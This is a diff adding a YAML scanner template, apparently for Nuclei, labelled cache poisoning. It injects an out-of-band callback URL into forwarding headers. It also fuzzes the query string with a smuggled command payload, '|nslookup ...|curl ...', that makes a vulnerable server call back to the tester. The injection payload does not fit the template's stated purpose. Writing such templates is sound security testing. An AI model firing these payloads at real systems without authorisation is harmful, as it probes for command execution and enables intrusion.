@@ -1,0 +1,42 @@
+id: cache-poisoning    
+
+info:
+  name: Cache Poisoning
+  author: 4rt3f4kt
+  severity: low
+
+variables:
+  marker: "{{interactsh-url}}"
+
+requests:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+        X-Forwarded-Prefix: "{{interactsh-url}}"
+        X-Forwarded-Host: "{{interactsh-url}}"
+        X-Forwarded-For: "{{interactsh-url}}"
+
+      - |
+        GET / HTTP/1.1
+        
+    stop-at-first-match: true
+    payloads:
+      interaction:
+        - "|nslookup {{marker}}|curl {{marker}}"
+
+    fuzzing:
+      - part: query
+        fuzz:
+          - "{{interaction}}"
+
+    redirects: true
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "http"
+        condition: or
+
